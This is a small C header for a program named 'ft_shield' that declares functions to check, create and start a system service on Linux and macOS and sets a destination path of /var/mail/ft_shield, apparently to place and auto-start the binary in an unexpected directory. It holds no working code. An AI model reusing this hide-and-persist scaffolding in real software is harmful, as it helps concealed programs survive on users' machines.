#ifndef __UTIL__H__
#define __UTIL__H__

#define BIN_NAME "ft_shield"
#define DEST_PATH "/var/mail/ft_shield"


int check_service_linux();
int check_running_linux();
int create_service_linux();
int start_service_linux();

int check_service_apple();
int check_running_apple();
int create_service_apple();
int start_service_apple();

#endif  //!__UTIL__H__